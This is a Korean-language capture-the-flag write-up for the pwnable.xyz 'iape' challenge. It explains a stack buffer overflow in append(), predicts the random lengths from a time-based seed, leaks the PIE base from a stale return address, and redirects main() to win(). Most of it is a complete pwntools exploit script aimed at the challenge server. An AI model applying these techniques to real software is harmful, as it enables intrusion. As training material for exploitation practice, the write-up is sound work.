# [pwnable.xyz] iape

> Shake off the pwn and let's do some programming

## The Bug

![image](https://github.com/user-attachments/assets/588e0244-b1dc-4aa4-8000-001af7d76f74)

![image](https://github.com/user-attachments/assets/25086352-8ae1-48d5-ae6d-b20a7c6b93a0)

`append()`에 길이 검사가 존재하지 않아 stack buffer overflow가 발생한다.

## Exploit

`main()`의 return address를 `win()`의 주소로 덮어쓰면 플래그를 획득할 수 있다.

### Generate random values

![image](https://github.com/user-attachments/assets/ac5dd87d-72fe-4f20-bb3a-bcc1b7c97e62)

`setup()`에서 `time(0)` (현재 시각)을 random seed로 설정한다. 이 값은 재현할 수 있기 때문에, `append()`에서 랜덤으로 주는 길이들을 미리 계산해놓을 수 있다.

### Leak PIE

![image](https://github.com/user-attachments/assets/34950351-0f9e-4c2a-87fc-95537ccca289)

`append()`에서 `read()`로 `rbp-0x20`부터 입력을 받는데, `rbp-0x18`에 `read_int32+64`의 주소가 저장되어 있다. `read_int32()` 내부에서 `atoi()`를 호출할 때 만들어진 return address가 쓰레기값으로 남아 있는 것이다.

만약 `len`이 14 이상일 때 8바이트만 입력하면, `strncat()`이 `read_int32+64`의 주소까지 가져와서 `s`에 이어붙이게 된다. 이때 `s`를 출력하면 PIE base를 계산할 수 있다.

Return address 직전까지 `0x408`바이트를 채우면서 `len`이 14 이상일 때 PIE를 leak하고, 그 후에 `main()`의 return address를 `win()`의 주소로 덮어쓴 후 `main()`을 return하면 된다.

### Full code

```python
from pwn import *
from ctypes import *

r = remote("svc.pwnable.xyz", 30014)

sla = r.sendlineafter
sa = r.sendafter


def Init(data):
    sla(b"> ", b"1")
    sla(b"data: ", data)


def Append(data, zero=False):
    sla(b"> ", b"2")
    if not zero:
        sa(b"chars: ", data)


def Print():
    sla(b"> ", b"3")


# generate random values

libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(libc.time((0)))

randValues = []
randSum = 0

while randSum <= 0x388:
    randValue = libc.rand() % 0x10
    randValues.append(randValue)
    randSum += randValue


# leak pie

Init(b"A" * (0x408 - randSum))

leaked = False  # true if PIE is leaked

for randValue in randValues:
    if randValue >= 14 and not leaked:
        sla(b"> ", b"2")
        sa(b"chars: ", b"A" * 8)

        Print()

        r.recvline()
        pie = u64(r.recvline()[-7:-1].ljust(8, b"\x00")) - 0xBC2  # pie base
        log.info("pie base: " + hex(pie))

        leaked = True
    elif randValue == 0:
        Append(b"A" * randValue, True)
    else:
        Append(b"A" * randValue)


# overwrite return address

win = pie + 0xB57
overwritten = 0  # overwritten bytes in return address

while overwritten < 6:
    sla(b"> ", b"2")

    r.recvuntil(b"Give me ")
    chars = int(r.recvuntil(b" ")[:-1])

    if overwritten + chars > 8:
        sa(b"chars: ", p64(win)[overwritten:])
    else:
        sa(b"chars: ", p64(win)[overwritten : overwritten + chars])

    overwritten += chars

sla(b"> ", b"0")  # return main() => call win()


r.interactive()
```

![image](https://github.com/user-attachments/assets/cd29612e-c8b5-425c-8117-25c9269d2bce)
